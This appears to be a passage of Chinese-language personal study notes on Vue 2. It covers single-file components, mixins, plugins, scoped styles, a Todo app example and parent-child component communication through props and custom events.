    data函数 methods中的函数 watch中的函数 computed中的函数 他们的this均是 Vue实例对象

5. VueComponent实例独享 以后简称vc 也可以称之为组件实例对象 Vue的实例对象简称vm

<br><br>

# 内置关系
```
VueComponent.prototype.__proto__ === Vue.prototype
```

让组件实例对象可以访问到vue原型上的属性和方法

<br>

上面是总结 而实际上是这样的
我们new Vue 会创建出来vue的实例对象 vue的实例对象的隐式原型属性一定指向它的缔造者的显式原型属性
```js
  // vue
  Vue  - Vue.prototype -  
                          ↘
                              Vue的原型对象
                          ↗
  Vm   - Vm.__proto__ -

                                              ↖
                                                ↖
                                                  ↖
  // vuecomponent
  vuecomponent  - Vue.prototype  
                                ↘
                                    vuecomponent的原型对象
                                ↗
  Vc   - Vc.__proto__ -
```

 Vue的原型对象 VueComponent的原型对象 都是对象 它们两个肯定也会有 Vc.__proto__ 指向的是object的原型对象 但是 vue 这时候做了一步

```
  VueComponent.prototype.__proto__ === Vue.prototype
```

没有让组件实例的原型对象指向object的原型对象 而是 指向了vue的原型对象 让组件实例对象vc可以访问到vue原型上的属性和方法

<br><br>

# Vue里 单文件组件的书写方式
非单文件组件不好的地方就是 结构不清晰 所有的组件都放在了一个html文件内部 同时 如果我们想给组件里面的结构添加样式的话 必须要到html文件的上方的``<style>`` 标签中书写 这样不太像组件化的逻辑

单文件组件的后缀都是以 .vue 的方式结尾的  
这种 .vue 文件我们直接交给浏览器 浏览器是没办法运行的 所以要是想让浏览器认识那么我们必须对这种文件进行加工

**加工的途径有两种:**   
1. webpack
2. 脚手架

这里我们在给 .vue 文件起名字的时候我们还要注意下
```js 
// 一个单词的 组件名
school.vue  /  School.vue

// 多个单词的 组件名
my-school.vue  /  MySchool.vue
```


我们创建一个 Test.vue 文件  
那么 Test.vue 文件中应该怎么写比较好呢？ 我们回想一下 组件的定义 一个标准的组件应该有三个部分是么 html js css 为了迎合这三个部分 vue给我们设计了与之对应的三个标签

<br>

### **单文件组件内的结构**
```html
<template>
  // 组件的结构
</template>


<script>
  // 组件的交互相关的代码 数据 和方法等等 我们定义的组件最终需要别的文件来引入 所以 我们这个部分应该将我们定义的组件暴露出去

  // —— 暴露的方式1
  export const Test = ...      // 分别暴露

  // —— 暴露的方式2
  const Test = ...
  export {Test}               // 统一暴露

  // —— 暴露的方式3
  extend default {直接暴露组件的配置对象}     // 默认暴露
</script>


<style>
  组件的样式
</style>
```

<br>

### **要点:**
1. 我们一般采用的是 默认暴露的方式 因为引入文件的时候方便调用者起名字
2. export default 直接暴露 组件的配置对象
```js 
正常我们创建组件的时候会使用 Vue.extend({ })
但是这个方法在我们写组件标签的时候vue会自动帮我们调用 
所以我们可以省略Vue.extend({ }) 直接默认暴露 组件的配置对象
```

3. name配置项 该配置项并不是组件的名字 但最好跟组件的名字写成一样的 该配置项是用来在开发者工具上显示的名字

大概的书写方式:
```html
<template>
  <h3>{{name}}</h3>
</template>

<script>
export default {
  name: 'Test',
  data() {
    return {
      name: 'sam'
    }
  }
}
</script>

<style scoped>
  h3 {
    padding: 5px;
    background: deepskyblue;
  }
</style>
```

<br>

### **app组件**
注意: 如果我们要写单文件组件的话 一定要创建一个app组件 该组件用来汇总所有的组件

1. 引入组件
2. 注册组件
3. 使用组件

```html
  <template>
    <div>
      <Test />
    </div>
  </template>

  <script>
  // App组件的作用是汇总所有的组件 所以我们要先引入组件
  import Test from './Test.vue'

  export default {
    name: 'App',
    components: {
      Test
    }
  }
  </script>

  <style> </style>
```

<br>

### **main.js文件:**
创建入口文件  

我们创建的单文件组件会汇总的App组件中 那我们的App组件是不是要在注册到vm里面才可以是么 那怎么创建vm组件呢？  
可不是通过上面的单文件组件的方式 我们要写js文件 亲自去new Vue

1. 引入 App 根组件
2. 创建Vue实例
3. 注册 App 组件

```js 
  // main.js 文件
  import App from './App'

  new Vue({
    el: '#root',
    components: {
      App
    },

    // 如果不想在index.html文件的root里写 调用app组件标签 也可以写在这里
    template: `
      <App />       
    `
  })
```

<br>

### **index.html**
该文件用于将组件 main.js 联系在一起 html文件中只写 div#root 就可以
```html
<body>
  <div id="root">

    <!-- 组件标签也可以写在 配置项的template中 -->
    <App />
  </div>

  <!-- 这里在脚手架中不用 只是写在这里让自己明白逻辑 -->
  <script src="../assets/js/vue.js"></script>
  <script src="./main.js"></script>
</body>
```

<br><br>

# ref属性
该属性在标签属性中使用 作用和id一样 可以给一个节点打上标识 用于获取该节点
```js 
<h3 ref='target'>我是App组件</h3>
```

<br>

**<font color="#C2185B">设置ref的方法:</font>**  
我们使用 ``ref="指定名"`` 的方式 在元素 or 组件上添加标签属性

<br>

**<font color="#C2185B">获取ref的方法:</font>**  
```js
this.$refs.target
```

如获取当前节点:
```js 
this.$refs.target.innerHTML = '哈哈'
```

<br>

### **在组件上使用 ref 和 id 的区别:**
通过 标签属性 id 获取的是 该组件的DOM结构
通过 标签属性 ref 获取的是 该组件的实例对象

<br><br>

# mixins  混入 / 混合
所谓的混入就是当各个组件中有一个部分完全一样的时候 我们可以将这个部分抽离出来 在各自的组件中删除代码 引入抽离的文件

也就是说两个组件共享一个配置 复用配置项

<br>

### **使用mixins时 data 和 methods 配置项重复的情况下:**
当混合文件中有 组件内部没有的时候 以混合文件为主  
当混合文件中没有 组件内部有 以组件内部的数据为主

<br>

### **使用mixins时 生命周期函数重复的情况下:**
混合文件中的 和 组件中的生命周期都会调用

同名的钩子函数将合并为一个数组 因此都将被调用 另外*mixin对象的钩子*将在组件自身钩子*之前调用*

<br>

### **使用场景:**
当组件的配置项中有重复的内容的时候 就可以使用混合 还可以将混合注册为全局混合

```js 
// 比如 两个组件都有 这样的一个地方 那么我就可以将这个部分抽离成一个js文件
methods: {
  showName() {
    console.log(this.name)
  }
}
```

<br>

### **使用方式:**
在 根目录 中创建 mixins 文件夹 里面创建js文件  
暴露一个对象 对象中是vue的一个个配置项 methods data ...
```js 
export const hunhe = {
  methods: {
    showName() {
      console.log(this.name)
    }
  }
}
```

上面把共通代码抽离成了一个js文件 接下来我们就在要使用的组件内部引入他们然后使用 混合配置项

<br>

### **配置项: mixins: []**
如果有配置项完全一致的时候可以使用混合的功能 抽离相同的配置项 然后在mixins配置项中使用混合是按配置项为单位进行抽离
```js 
import {hunhe} from 'mixin.js'

export default {
  mixins: [hunhe]
}
```

<br>

### **全局混合:**
使用这种方式的混合所有的vm vc都会得到混合文件中的东西 我们在入口文件中 引入混合文件 和 配置

<br>

### **Vue.mixin()**
全局配置混合
```js 
import {hunhe, hunhe2} from 'mixin.js'
Vue.mixin(hunhe)
Vue.mixin(hunhe2)
```

<br>

### **要点:**
1. data  
每个mixin都可以拥有自己的data 每个data函数都会被调用 并将返回结果合并
在数据的 property 发生冲突时 会以组件自身的数据为优先。

2. 值为对象的选项   
例如 methods、components 和 directives 将被合并为同一个对象。两个对象键名冲突时 取组件对象的键值对。

<br>

### **总结:**
1. 混合中的this是该组件的对象
2. 混合中的所有数据都会被放在vm身上 所以正常使用数据 和 调用方法就可以

<br>

**注意: 报错 named exportはエラーになるので**  
上面的方式是定义了一个js文件 然后通过在页面中引入js文件
```js
import {xxx} from "./mixins/xxx.js"
```

并在页面中通过 mixins配置项来注册使用的但是在项目中 这种方式 会有警告
```js 
named exportはエラーになるので
```

### **解决方案:**
我们先了解一下 基本的概念

es6中 export 一般的用法有两种  
1. 命名导出 - named exports
2. 默认导出 - default exports

<br>

### **命名导出 named exports**
就是每一个需要输出的数据类型都要有一个name 统一输入一定要带有{} 即便只有一个需要输出的数据类型。这种写法清爽直观 是推荐的写法。

<br>

### **默认导出 defaule exports**
默认输出就不需要name了 但是一个js文件中只能有一个export default

我们在使用混合的使用 可以这么写
```html
<script>
  export default {
    data() {
      return {

      }
    }
  }
</script>
```

引入的时候 就相当于 引入组件的方式 这样警告就没有了

<br><br>

# 插件
插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制——一般有下面几种：
- 添加全局方法或者 property。如：vue-custom-element
- 添加全局资源：指令/过滤器/过渡等。如 vue-touch
- 通过全局混入来添加一些组件选项。如 vue-router
- 添加 Vue 实例方法，通过把它们添加到 Vue.prototype 上实现。
- 一个库，提供自己的 API，同时提供上面提到的一个或多个功能。如 vue-route

Vue.use 会自动阻止多次注册相同插件，届时即使多次调用也只会注册一次该插件。

我们定义一个 plugins.js 文件 写插件

<br>

### **插件的定义方法:**
vue要求
1. 插件必须是一个对象
2. 对象内部含有install方法

这个插件vue会帮我们调用 就像是将所有的东西统一安装一样  
install方法中能够接收到 Vue 也就是vm的缔造者
```js 
export default {
  install(Vue, [接收到使用者传递的参数]) {
    // 比如我们可以在这里面配置n种全局配置 当vue帮我们调用这个install后 vm vc都能使用这些全局配置了 比如格式化 混入 自定义指令等等
  }
}
```

插件就相当于外挂一样 我们一般使用外挂都是先开启外挂然后再进入游戏 vue的插件也是一样的先应用插件然后创建vm

<br>

### **Vue.use(Vue, [使用者传递的参数])**
vue中使用这个api应用插件  
应用插件后 vue 会给我们调用 我们定制的插件中的方法  
express里面是使用express.use使用中间件

也就是说 入口文件里 创建 new Vue之间我们就先需要应用 我们定义的插件
```js 
import Vue from 'vue'
import App from './App'

// 引入插件
import plugins from './plugins'
Vue.config.productionTip = false

// 应用插件
Vue.use(plugins)

new Vue({
  el:'#app',
  render: h => h(App)
})
```

<br>

### **Vue的按需加载实现思路:**
比如我们开发了一个组件库 我们也希望能够做到 按需加载的逻辑
```
| - UI_Lib
  | - Button
    - index.vue
  | - input
    -index.vue
  
  - index.js
```

我们的UI库下面有两个组件 现在我们需要在Vue中安装我们的UI库 我们会使用 Vue.use(UI库) 是么

<br>

### **全部加载:**
```js
import UI from "./plugins/index.js"
Vue.use(UI)
```

<br>

### **按需加载:**
```js
// 第二个参数 可以被 install 的中的第二个参数options接收到
Vue.use(UI, {
  components: {
    "MyButton",
    "MyInput"
  }
})
```

```js
// 引入 Button Input 组件
import MyButton from "./Button/index.vue"
import MyInput from "./Input/index.vue"

const UI = {}

// options: 就是main.js文件中 Vue.use() 的第二个参数
UI.install = function(Vue, options) {
  console.log(options)
  // ["MyButton", "MyInput"]

  我们能从 options 身上拿到 我们 Vue.use() 的时候传入的信息 

  那么我们是不是就可以 利用 Vue 参数 将组件动态的添加到 Vue身上了
}

export default UI
```

<br><br>

# ``<style scoped lang>`` 样式
我们在组件内写的style样式最终这些样式都会汇总到一起 所以同名的样式会被覆盖掉
会按照组件在App的组件中的引入的先后顺序 下面的组件的样式会覆盖掉上面的样式

<br>

### **组件内 ``<style scoped>``:**
解决方式就是在 style标签里面添加 scoped 属性
我们加上这个属性之后 *该组件内的样式只负责该组件其它的样式不管*

**原理:**   
它会给写样式的div身上加一个自定义属性后面的数字都是随机生成的确保不一样
```js 
<div data-v-234234 class='demo'>
```

**注意:**  
app组件写样式的时候*不适合使用 scoped 这个样式*   
app是所有组件的源头 不加scoped就是修改全局的样式 一般App要是写样式了 代表所有组件都会用的

<br>

### **样式穿透: deep 的使用**
一般在使用scoped后 父组件的样式将不会渗透到子组件中 而我们调用的element组件就相当于在父组件中使用子组件

这时候我们想改变element组件的部分样式时 就要在class类名前加上 /deep/ 或者 >>> 或者 ::v-deep
```scss
.(外层class) >>> .(内层class)
```

vue在解析样式的时候会在类名的后面加上[vasdf2323]之类的属性 当我们使用 deep 后该属性就会加在外层class上 获取我们修改的样式就会生效

```scss
.(外层class) .(内层class)[data-v-asfda123]
.(外层class) >>> .(内层class)   ---   .(外层class)[data-v-asfda123]  .(内层class)
```

```scss
  .table-wrap /deep/ .el-table__header-wrapper .cell {
    padding-left: 0;
  }
```

<br>

### **scss中的使用方式:**
```scss
::v-deep {
  img {
    width: 100%;
    height: auto;
  }
}
```

<br><br>

### **less scss 的使用方式: ``<style lang='less'>``**
我们在写样式的时候 可以使用less 直接这么写标签就可以了  
但是需要安装 less-loader

**下载:**  
```
npm i less less-loader@7
```
```
less版本 4xx 好处 好像也是最新的
可能会报错 因为不兼容 因为webpack的最新版本已经是5了 但是脚手架的话里面使用的webpack的版本可能是4

因为我们脚手架里面使用的是4.xx 

如果我们默认安装less-loader的话就是安装的最新版本 less-loader的最新版本是为了迎合webpack5

所以就发生了 我们脚手架里面是使用的是4 而我们却用了最新的less-loader
```

我们在安装less-loader前使用 如下命令 查看 webpack 的最新版本  
```
npm view webpack versions
npm view less-loader versions
```

我们可以指定7版本

<br>

### **Vue中 scss 的使用方式**
vue环境下 经过测试这种搭配在 node: 14版本下可以正常的运行

**首先运行命令:**  
```
npm install --save-dev sass node-sass sass-loader


npm install --save-dev sass@1.55.0 node-sass@4.14.1 sass-loader@8.0.2
```

指定各个版本
```js
"node-sass": "^4.14.1",
"sass-loader": "^8.0.2",

"sass": "1.32.13",  // 这个并没有指定 没写这行 备忘用
```

<br><br>

# Todo案例:

### **数据放在哪个组件？**
我们对页面拆分组件后 要想数据在哪个组件展示 我们就放在哪个组件 也就是todolist案例里面

将列表做成了一个组件 -- MyList组件
将列表中的每一项单独的做成了一个组件 -- MyItem组件

那就涉及到数据要放在哪里的问题 我们要将数据展示在MyList组件里面 所以我们就放在哪个组件里面

MyList组件只负责对数据的展示 并不负责操作数据
还可以放在最外层的结构上 这样传递数据的时候 又多了种可以层层传递的技巧

<br>

### **向子组件传递数据:**
我们将数据放在了 MyList组件 里面 然后我们根据数据去遍历 列表中的每一项  
同时我们还要把子组件需要的数据传递进去 我们把 item in todos中的item传递到子组件里面
```js 
// 父组件  传递过去一个todo
<MyItem v-for='item of todos' :todo='item'>

// 子组件  声明接收一个todo
<span>{{todo.title}}</span>

// 使用 props 配置项
props: ['todo']
```

<br>

### **数据类型中id - 到底用什么类型的数据比较好？**
在js中数字型的id是有尽头的 一般都用字符串的类型

<br>

### **怎么控制 标签内部的属性 有还是没有**
或者我们使用三元表达式  
在上面的案例中我们直接去问todo.done就可以
```js 
<input type='checkbox' :checked='todo.done'>
```

<br>

### **按下回车后将用户输入的信息 生成新的一项**
我们需要将用户的输入包装成一个todo对象
```js 
// 一个todo对象
{id: '001', title: '喝酒', done: false}

<input type='text' @keyuo.enter='add'>

methods: {
  add() {
    const todoObj = {
      id: nanoid(),
      title: e.target.value,
      done: false
    }
  }
}
```

<br>

### **nanoid的使用方式**
1. npm i nanoid
2. import {nanoid} from 'nanoid'
3. nanoid是一个函数 直接调用生成唯一的字符串

**注意:**  
正常来说 我们在组织数据结构的时候不用组织id进到对象里 我们只需要整理其它的数据 数据库会自动给我们生成id  
随机数  
时间戳  
uuid / nanoid  
它的算法是你目前所处的地理位置 加上电脑的mac地址 加上你的序列号


将我们包装起来的todoobj添加到数据的数组中就可以了  

**问题:**  
我们创建的 todoobj 是在 header组件里面 数据在 MyList 组件里面 怎么添加进去呢？可以兄弟组件之间怎么传递数据呢？
```js 
--- MyList      // -- 数据的存放位置
    --- MyItem

--- Header      // -- 用户输入 生成的信息obj
```

兄弟组件之间怎么传递数据:
- 事件总线
- 消息发布与订阅
- vuex

<br>

### **使用reduce方法 总结已完成的数据**
```js
this.todos.reduce((pre, todo) => pre + (todo.done ? 1 : 0))
```

<br>

### **□ 已完成2 / 全部3**
什么时候前面需要打上对号？  

**思路:**   
已完成 和 全部都使用计算属性来说 我们可以在
```js 
checkbox checked = 变量1 === 变量2 && 变量2 > 0

// 也就是说 全部 要大于0 总数大于0并且变量1 2 相等的时候
```

<br>

### **将用户保存的数据 放在本地存储中**
那什么时候往本地存储里面放呢？我们使用watch监视属性 只要我们操作了todos那么我就把它放本地存储中放
```js 
data: {
  // todos: []
  todos: JSON.parse(localStorage.getItem('todos')) || []
}
/*
  我们使用监视属性 监视todos value就是todos最新的值 因为我们在添加的时候是将用户输入的信息整理成一个对象 然后使用vue认可的数组的方法 unshift 插入到数组中的

  这样添加进本地存储的都是最新的值
  如果修改内部对象里面的属性的时候 我们就开启深度监视
*/

watch: {
  todos: {

    deep: true

    handler(value) {
      localStorage.setItem('todos', JSON.stringify(value))
    }
  }
}
```

<br>

### **编辑每一个todo项的内容**
我们给每一行 todo 都添加一个编辑按钮 用于修改 睡觉  
当处于修改状态的时候 睡觉应该出现在一个input里面 当结束修改的时候 变成正常状态
```js 
□ 睡觉    ----   编辑  删除


// 我们在写 checkbox 是否勾选的时候 使用的是一个变量来控制它是否选中 todo.done 来控制的
{
  id: nanoid(),
  title: e.target.value,
  done: false
}

/*
  现在我们要控制 文本是否处于编辑状态 也可以添加一个属性 
  isEdit为真 睡觉应该处于一个input里面 
  isEdit为假 正常显示文字
*/
  
{
  isEdit: false

  id: nanoid(),
  title: e.target.value,
  done: false
}
```

两个结构只有一个显示 根据一个变量控制 另一个使用v-if将变量取反
```js 
<div v-if='!isEdit'>{{name}}</div>
<div v-if='isEdit'><input type="text" :value='name'></div>
```

**注意:**  
往对象中添加属性的时候 我们要是想要响应式 也就是让vue监测到要使用
```js
this.$set(todo, "isEdit", true)
```

<br>

### **当点击编辑按钮后 输入框内的文本自动获取焦点**
当我们如下操作的时候 并没有获取焦点 为什么？
```js 
handle() {
  if(todo.hasOwnProperty('isEdit')) {
    todo.isEdit = true
  }

  this.$refs.inputTitle.focus()
}

/*
  我们的逻辑是: 
  逻辑是我们判断todo对象中有没有isEdit 如果有代表应该将 
  文本变为input框 + 文本的格式

  todo.isEdit = true

  当我们将isEdit设置为true的时候 vue就会监测到然后vue就会立刻的帮我们解析模板 然后input框就会出来了 然后我们执行这段代码

  this.$refs.inputTitle.focus()

  input框就会获取焦点

  ---

  但是真实的流程是这样的: !!!
  todo.isEdit = true
  这句话之后 Vue并没有马上帮我们解析模板 Vue是继续往下走 走了这句话 this.$refs.inputTitle.focus() 然后解析模板

  由于html结构的部分我们是用v-show控制着input的出现 走这句话的时候
  this.$refs.inputTitle.focus()

  input框还没有来到页面
  Vue是将里面所有的代码执行完毕才会解析模板
*/
```

**因为: Vue会将一个回调中的代码全部执行完毕才会去解析模板**  

<br>

### **解决方式1: 使用延时定时器**
```js 
setTimeout(function() {
  this.$refs.inputTitle.focus()
}, 200)
```

<br>

### **解决方式2: this.$nextTick(callback)**
$nextTick指定的回调会在dom节点更新后才会执行
```js 
// Vue会在模板解析完毕之后再调用里面的函数 这样就能保证会在节点更新后再去触碰节点
this.$nextTick(function() {
  this.$refs.inputTitle.focus()
})
```

<br>

### **总结: 组件化的编码流程**
- 拆分静态组件 组件要按照功能点拆分 命名不要与html元素冲突
- 实现动态组件 考虑好数据的存放位置 数据是一个组件在用 还是一些组件在用  
  一个组件在用   
  一些组件在用 放在他们共同的父组件上这也是状态提升

- props适用于  
  父组件 -- 子组件 通信  
  子组件 -- 父组件 通信 要求父先给子一个函数

- 使用v-model的时候要切记 v-model绑定的值不能是props传递过来的值 因为props是不可以修改的

- props传过来的若是对象类型的值 修改对象中的属性时 vue不会报错 但不推荐这么做

<br><br>

# Github案例

### **引入外部样式库**
项目中需要引入外部的ui库的时候 我们通常有2种方式存放ui样式库

<br>

### **将ui样式库存放在src文件夹下**
- 在 src 文件夹内部创建 assets 文件夹 将boorstrap放入其中
- 在 App 组件 script部分 引入 boorstrap css样式
```html 
<script>
import ./assets/css/bootstrap.css'

export default {
  name: 'App',
}
</script>
```

**注意:**  
如果将样式库存放在 src / assets / 的时候 我们引入该样式就必须通过
import 引入

通过 import 引入的文件 webpack会严格的检车内部文件情况 以及依赖关系 如果存在问题会报错

<br>

### **将ui样式库存放在public文件夹下**
- 在 public 文件夹下创建css文件夹 将boorstrap放入其中
- 在html文件中 通过 link标签引入
```js 
<link 
  rel="stylesheet" 
  href="<%= BASE_URL %>css/bootstrap.css"
>
```

<br>

### **List组件 要根据请求数据的情况 呈现不同的信息**
1. welcome
2. loading
3. users
4. 网络错误页面

我们不能根据 users数组的长度去判断是否要展示loading 
1. 因为页面上上来 users数组的长度就是0 但是我们要展示的是welcome
2. 如果网络错误请求回来的数据为空 users数组的长度也是0 但我们要展示的是网络错误页面

我们需要在 data 中设置也几个标识的变量
```js 
data: {
  isFirst: true
  isLoading: false    // 当点击搜索按钮的时候才是正在加载
  errMsg: ''
  users: []
}

// 页面上展示什么 根据上面的变量来决定 比如

// 展示用户数据
<div v-show='users.length'>

// 展示欢迎词
<div v-show='isFirst'>

// 展示加载中
<div v-show='isLoading'>

// 展示错误信息
<div v-show='errMsg'>
```

<br>

上面的4个标识状态需要随着请求的发送 发生变化

**情况1:**  
当我点击搜索按钮之后 这些值应该是什么样的？
```js 
data: {
  isFirst: false      // 点按钮了 该状态 就不需要 欢迎词了 false
  isLoading: true     // 点按钮了 该状态 就是加载中 true
  errMsg: ''
  users: []
}
```

<br>

### **当一个对象中有4个属性 另一个对象中有3个属性 我想保留多出的一个属性 只替换重名的三个属性**
```js 
this.info = {...this.info, ...dataObj}
```

<br><br>

# vue-resource
我们前面都是使用 axios 等库发送的请求  vue-resource 是一个插件库 现在这种方式用的不多了 我们作为了解

<br>

### **使用方式:**
下载:
```
npm i vue-resource
```

在main.js文件中 注册刚才下载的 vue-resource
```js 
import Resource from 'vue-resource'
Vue.use(Resource)
    // 注册后 所有的vm vc身上都会多了一个 $http
```
<br>

### **this.$http.get / post**
这个 vue-resource 身上方法 用法 返回值 跟axios是一模一样的

<br><br>

# 组件之间的通信
下面就是组件之间的通信 我们将下面结构分成什么样 的组件? 
组件之间的通信就是数据之间的传递
```
------------------
|                |
|                |   -- > 轮播图
------------------

------------------
|                |
|                |  -- > 开发相关
------------------

------------------
|   ----------   |
|  |          |  |
|   ----------   |
|                |
|   ----------   |  -- > 列表部分 成
|  |          |  |       内部有小组件 小组件可以通过v-for遍历生成
|   ----------   |
|                |
|   ----------   |
|  |          |  |
|   ----------   |
------------------
```

我们上面一共有3个组件 第3个组件中有3个列表

当我们开发列表的时候肯定是先向服务器发送请求, 请求列表数据, 那请求列表数据这个动作(相关的请求代码)在哪里请求比较好?


整体是一个组件 3的列表部分是一个组件, 3列表里面又是小组件, 那请求相关的代码放在哪里比较合适

一般情况下 我们会在最外层最大的组件(也就是说包裹上面3个大组件的整体组件)内部写上发送请求的相关代码

发送请求后 我就能在最外层最大的组件内容拿到返回的数据了, 拿到数据后 我可以把数据存放在最外层最大的data里面 比如我们拿到的数据叫做 productList 一个商品列表

但是有一个问题, 我们最外层最大拿到的这个数据并不是它自己要使用的 而是交给下面第三个组件列表部分展示的 它才是最终展示列表的地方

这个时候我们就要做一个事情, 就是从我们请求到的 productList 数据传递给 3这个组件 只有传递过去后 才能在下面使用v-for的指令生成结构 变量

v-for='(item, index) of productList'
然后再把item传递给3中的小组件, 让小组件根据item来创建一个个的列表结构


在上一节中, 我们提到了子组件是不能引用父组件或者Vue实例的数据的 但是, 在开发中, 往往一些数据缺失需要从上层传递到下层

比如一个页面中, 我们从服务器请求到了很多的数据 其中一部分数据 并非是我们整个页面的大组件来展示的, 而是需要下面的子组件进行展示

这个时候, 并不会让子组件再次发送一个网络请求, 而是直接让大组件(父组件)将数据传递给小组件(子组件)


<br>

### **父 到 子 之间的通信: props**

<br>

### **子 到 父 之间的通信: 自定义事件**
```
      --- Pass Props --- >    

Patent(父组件)        child(子组件)

      < --- $emit Events --- 
```

在真是的开发中, Vue实例和子组件的通信和父组件和子组件的通信过程是一样的

<br><br>

# 组件之间的传递 父 传 子 - props

### **配置项 props:**
props用于父子组件的相互通信也就是传递数据

该方式类似于微信转账 我这边给你转账 你需要点击确认收款 映射到props上就是 父组件向子组件传递数据 子组件要确认接收该数据

<br>

### **应用场景:**
我们创建了一个组件 希望组件中的内容 是根据父组件传递的数据决定的  
也就是组件在复用 数据是动态的

<br>

### **1. 父组件在子组件标签属性部分 传递数据**
**传递数据的方式有两种:**

```html
<!-- 情况1: 可以直接传递: 该种情况传递的只能是字符串 -->
<Son key="value">

<!-- 情况2: 使用v-bind传递: 传递 data配置项中定义好的数据 -->
<Son :key="value">
```

<br>

**示例:**  
```js 
<Student name='我是小暖暖' age='18'/>
// 这么传递 子组件接收的都是字符串

<Student :name='name' :age='18'/>
// 这么传递 即可以传递在data中的数据  也可以传递数字类型的数据
```

<br>

### **2. 子组件在props配置项确认接收**
父组件传递的数据会被收集在组件的实例对象上(vc) 也就是说只要vc身上有的属性 模板中都可以直接使用
```js 
props: ['name', 'age']
```

<br>

### **props配置项: 对象形式**
上面使用 props 的数组形式 进行了简单的 数据接收 这里我们可以使用对象形式 可以设置接收数据的 类型 和 默认值

子组件在接收props的同时可以对数据的类型做限制

<br>

**简单的类型限制:**  
子组件在接收的时候 props配置项为对象
```js
props: {
  接收数据的变量: String,
  接收数据的变量: Number,
}

props: {
  name: String,
  age: Number
}
```

<br>

**完整的类型限制:**  
子组件在接收的时候 props配置项为对象 同时每一个接收数据的变量的类型也是一个对象 用于配置更加丰富的限制信息
```js
props: {
  // 对象
  接收数据的变量: {
    type: String,
    required: true,
    default: 'sam'
  }
}
```

一般情况下 required 和 default 不会同时出现
```js  
props: {
  name: {
    type: String,
    required: true,
    default: 'sam'
  }
}
```

当 type 为 Array Object 的时候 default必须是一个函数且返回值就是默认值
```js 
props: {
  person: {
    type: Array | Object,

    default: () => [] | ({})

    default() {
      return []
    }
  }
}
```

数组的默认值
```js 
default: () => []
```

对象的默认值
```js 
default: () => ({})
```

函数的默认值
```js 
default: () => {}
```

<br>

### **限制属性:**
- type:  
接收数据的数据类型 / 父组件传递进来的数据类型

- default:   
当模板中没有使用接收的数据时, 默认显示的数据注意type是什么类型, defaule就得写什么类型的值, 

- required:true  
当为true时, 父组件必须传递这个属性

<br>

### **自定义props的规则:**
传递的属性值中必须是下面字符串中的一个
```js 
validator: function(value) {
  return ['succsess', 'warining', 'danger'].indexOf(value) !== -1
}
```

我们还可以自定义函数用来验证别的类型(列表中没有的类型)
```js 
function Person(firstName, lastName) {
  this.firstName = firstName,
  this.lastName = lastName
}

Vue.component('blog-post', {
  props: {
    author: Person(上面必须都是array object 我们自定义个类型Person)
  }
})
```

<br>

### **props的方式 不仅能传递数据 还能传递方法**
```js 
// 父组件中 在父组件标签内使用v-bind  父组件定义方法 子组件通过 props 传递到子组件
<app :addComment='addComment'>

methods: {
  addComment(comment) {
    this.comments.unshift(comment)
  }
}

// 子组件:
props: {
  addComment: {
    type: Function,
    required: true
  }
}

methods: {
  // 在子组件中通过this调用
  this.addComment(comment)
}
```

<br>

### **props中 函数的默认值 使用示例:**
**要点:**  
不能写成箭头函数 内部的 this 会丢

```js 
// 子组件
props: {
  fn: {
    type: Function,
    default: function(data) {
      this.$emit("send:data", data)
    }
  }
},
methods: {
  handleClick() {
    this.fn("hello")
  }
}

// 父组件
<Child @send:data="handleSend"/>
data() {
  return {
    title: "sam",
    msg: ""
  }
},
methods: {
  handleSend(data) {
    this.msg = data
  }
}
```

<br>

### **props数据类型的验证都支持哪些数据类型呢?**
- String
- Number
- Boolean
- Array
- Object
- Date
- Function
- Symbol

当我们有自定义构造函数时, 验证也支持自定义的类型


**注意:**  
- 子组件在声明接收的时候 父组件没有传递的属性 不要声明接收 就是不要瞎声明
- 接收到的props是不推荐改的 当它们是只读属性 要不vue会产生一些奇奇怪怪的问题(应该派发事件通知父组件来进行修改)

- 父组件在组件标签内部传递数据的变量 不能使用vue中预定义的变量名
- 当类型type是对象object 或者数组的时候 array  
默认值default必须是一个函数 里面return一个数组 或者 对象
    ```js 
    props: {
      cmovies: {
        type: String,
        default: 'aaa',     // 这样不行 改成

        default() {
          return [] or {}   // 这样的形式才可以
        }
      }
    }
    ```

- *props的优先级高 它会覆盖掉data computed里面的同名数据*

<br><br>

# 组件之间的传递 子 传 父

### **方式1: 通过props方式 父组件 向 子组件 传递回调**
有些时候 我们需要子组件向父组件传递数据 那么怎么做呢

**1. 利用props向子组件先传递方法**  

**2. 子组件调用props中的方法 将数据通过实参传递到函数里 父组件通过形参接收 然后父组件做处理**

- 父组件中定义方法准备接收数据
- 父组件将定义的方法使用props的方式发送到子组件
- 子组件声明接收父组件发送过来的函数 将数据通过实参传递 父组件使用形参接收
```js 
// 父组件
<App>
  <MyHeader> </MyHeader>
  <MyList :receive='receive'></MyList>
</App>

methods: {
  // receive英语是接收的意思
  receive(todoObj) {
    // todoObj 就是 子组件 传递过来的数据
  }
}


// 子组件
props: ['receive']    // 这里是父组件传递过来的函数
methods: {
  // 子组件中的事件逻辑内部 调用父组件传递过来的事件
  add(e) {
    // 我们将这个数据 送回父组件
    const todoObj = {id:nanoid(), title: e.target.value, done: false}
    this.receive(todoObj)
  }
}
```

<br>

### **方式2: 通过自定义事件方式 父组件 向 子组件**
**需求:**   
嵌套组件 当点击存放在子组件中的按钮 将子组件的 数据 交给它的父组件

**<font color="#C2185B">this.$emit('事件名', [数据])</font>**  
子组件使用 this.$emit() 方法 发送数据

<br>

**<font color="#C2185B">父组件中 在子组件标签属性上使用 v-on绑定 子组件派发的自定义事件</font>**  
父组件在接收子组件发射过来的参数的时候 可以这样 (name, ...a), 用于接收除了name以外的剩余参数

**示例:**  
```js
// 父组件
<Son @customerEvent="handler">
// 还可以只绑定一次
<Son @customerEvent.once="handler">

methods: {
  handler(data) {
    console.log(data)
  }

  // 或者
  handler(name, ...args) {
    console.log(name)
  }
}


// 子组件
<button @click="send">click</button>

methods:{
  send() {
    this.$emit("customerEvent", this.msg)
  }
}
```

<br>

**监听子组件派发出来的事件的另一种方式:**  
首先, 通过 ref 取得子组件实例  
然后, 通过 *子组件实例.$on()* 的方式 进行绑定事件  

该灵活性比较强 比如我可以等ajax请求回来后再去给子组件绑定事件
```js 
// 获取 子组件 实例
<Student ref='student'/>

// 挂载后再绑定
mounted() {
  this.refs.student.$on('子组件自定义事件名', 父组件中的回调)
}

// 只触发一次
mounted() {
  this.refs.student.$once('子组件自定义事件名', 父组件中的回调)
}
```

<br>

**<font color="#C2185B">自定义事件的解绑:</font>**  
